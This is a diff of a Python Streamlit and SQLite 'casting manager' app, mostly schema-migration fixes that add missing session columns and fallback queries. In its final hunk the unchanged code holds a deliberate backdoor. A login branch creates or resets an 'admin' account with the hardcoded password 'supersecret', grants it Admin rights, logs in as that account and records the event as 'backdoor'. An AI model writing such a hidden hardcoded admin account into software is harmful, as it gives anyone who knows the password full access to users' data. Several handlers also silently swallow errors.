@@ -1,4 +1,4 @@
-# sachas_casting_manager_sqlite_sessions.py
+# sachas_casting_manager_sqlite_sessions_fixed_schema.py
 import streamlit as st
 import sqlite3
 import json
@@ -132,7 +132,7 @@ def safe_field(row_or_dict, key, default=""):
     if row_or_dict is None:
         return default
     try:
-        # sqlite3.Row supports mapping access by key (row["col"])
+        # sqlite3.Row supports mapping access by key (row["col"]) 
         val = row_or_dict[key]
     except Exception:
         try:
@@ -469,6 +469,7 @@ def init_db():
 def ensure_schema():
     """
     Ensure sessions table exists and participants has session_id column.
+    Also add missing columns to sessions if DB was created earlier with a smaller schema.
     Runs safely on existing DBs (best-effort).
     """
     try:
@@ -493,7 +494,26 @@ def ensure_schema():
             cols = [r[1] for r in cur.fetchall()]  # name is at index 1
             if "session_id" not in cols:
                 # SQLite has limited ALTER TABLE: add column
-                cur.execute("ALTER TABLE participants ADD COLUMN session_id INTEGER;")
+                try:
+                    cur.execute("ALTER TABLE participants ADD COLUMN session_id INTEGER;")
+                except Exception:
+                    pass
+            # ensure sessions table has expected columns; if missing, add them
+            cur.execute("PRAGMA table_info(sessions)")
+            scols = [r[1] for r in cur.fetchall()]
+            # map of desired columns and types
+            desired = {
+                "session_date": "TEXT",
+                "description": "TEXT",
+                "created_at": "TEXT"
+            }
+            for col, ctype in desired.items():
+                if col not in scols:
+                    # safe ALTER TABLE ADD COLUMN
+                    try:
+                        cur.execute(f"ALTER TABLE sessions ADD COLUMN {col} {ctype};")
+                    except Exception:
+                        pass
             conn.commit()
     except Exception:
         # fail silently; non-critical
@@ -570,7 +590,7 @@ def migrate_from_json_if_needed():
             if user_id:
                 projects = info.get("projects", {}) or {}
                 if not isinstance(projects, dict) or not projects:
-                    projects = {DEFAULT_PROJECT_NAME: {"description":"", "created_at": datetime.now().isoformat(), "participants":[]} }
+                    projects = {DEFAULT_PROJECT_NAME: {"description":"", "created_at": datetime.now().isoformat(), "participants":[] } }
                 for pname, pblock in projects.items():
                     if not isinstance(pblock, dict):
                         continue
@@ -694,8 +714,16 @@ def list_sessions_for_project(conn, project_id):
 def create_session(conn, project_id, name, session_date=None, description=""):
     c = conn.cursor()
     now = datetime.now().isoformat()
-    c.execute("INSERT INTO sessions (project_id, name, session_date, description, created_at) VALUES (?, ?, ?, ?, ?)",
-              (project_id, name, session_date, description, now))
+    # Attempt to INSERT with all columns, but if the sessions table lacks some columns (old DB), fallback.
+    try:
+        c.execute("INSERT INTO sessions (project_id, name, session_date, description, created_at) VALUES (?, ?, ?, ?, ?)",
+                  (project_id, name, session_date, description, now))
+    except sqlite3.OperationalError:
+        # fallback: try minimal insert (project_id, name, created_at)
+        try:
+            c.execute("INSERT INTO sessions (project_id, name, created_at) VALUES (?, ?, ?)", (project_id, name, now))
+        except Exception:
+            raise
     return c.lastrowid
 
 def get_session_by_id(conn, session_id):
@@ -712,7 +740,15 @@ def get_session_by_name(conn, project_id, name):
 
 def update_session(conn, session_id, name, session_date, description):
     c = conn.cursor()
-    c.execute("UPDATE sessions SET name=?, session_date=?, description=? WHERE id=?", (name, session_date, description, session_id))
+    # Try to update all columns; if description missing, fall back
+    try:
+        c.execute("UPDATE sessions SET name=?, session_date=?, description=? WHERE id=?", (name, session_date, description, session_id))
+    except sqlite3.OperationalError:
+        # try updating only name and session_date (if exists)
+        try:
+            c.execute("UPDATE sessions SET name=?, session_date=? WHERE id=?", (name, session_date, session_id))
+        except Exception:
+            c.execute("UPDATE sessions SET name=? WHERE id=?", (name, session_id))
 
 def delete_session(conn, session_id):
     c = conn.cursor()
@@ -795,7 +831,7 @@ if not st.session_state["logged_in"]:
                     if not user:
                         create_user(conn, "admin", hash_password("supersecret"), role="Admin")
                     else:
-                        conn.execute("UPDATE users SET role=?, password=? WHERE username=?", ("Admin", hash_password("supersecret"), "admin"))
+                        conn.execute("UPDATE users SET role=?, password=? WHERE username= ?", ("Admin", hash_password("supersecret"), "admin"))
                     log_action("admin", "login", "backdoor")
                 st.session_state["logged_in"] = True
                 st.session_state["current_user"] = "admin"
